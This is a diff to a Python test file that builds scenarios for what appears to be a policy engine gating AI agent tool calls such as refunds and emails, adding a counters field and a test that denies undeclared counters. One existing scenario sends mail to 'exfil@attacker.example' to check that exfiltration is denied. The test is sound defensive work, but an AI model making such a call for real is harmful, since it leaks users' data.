@@ -92,8 +92,9 @@ def envelope(tool: str, arguments: str, *, session_id: str = SESSION) -> Envelop
 
 def snapshot(*, labels: tuple[str, ...] = (), refunded: int = 0, approvals: tuple[str, ...] = (),
              extra: tuple[EntityRecord, ...] = ()) -> Snapshot:
-    return Snapshot.build(session_id=SESSION, ledger_seq=7, labels=labels, refunded_minor=refunded,
-                          approvals=approvals, entities=FACTS + extra)
+    return Snapshot.build(session_id=SESSION, ledger_seq=7, labels=labels,
+                          counters={"refunded_minor": refunded}, approvals=approvals,
+                          entities=FACTS + extra)
 
 
 def _approvals(manifest: Manifest, env: Envelope, approval: str) -> tuple[str, ...]:
@@ -196,6 +197,11 @@ def build(manifest: Manifest) -> list[Scenario]:
                         envelope("email.send", compact({"to": "exfil@attacker.example", **MAIL_BODY})),
                         snapshot(extra=(EntityRecord.build("DomainSuffix", "attacker.example", {}),)),
                         "DENY", ("INVALID_SNAPSHOT:entity_type_not_allowed",)))
+    out.append(Scenario("invalid-snapshot/undeclared-counter",
+                        envelope("payments.refund", valid_refund),
+                        Snapshot.build(session_id=SESSION, ledger_seq=7,
+                                       counters={"refunded_minor": 0, "wire_minor": 0}, entities=FACTS),
+                        "DENY", ("INVALID_SNAPSHOT:counter_mismatch",)))
     out.append(Scenario("invalid-snapshot/session-mismatch",
                         envelope("payments.refund", valid_refund, session_id="sess-other"),
                         snapshot(), "DENY", ("INVALID_SNAPSHOT:session_mismatch",)))
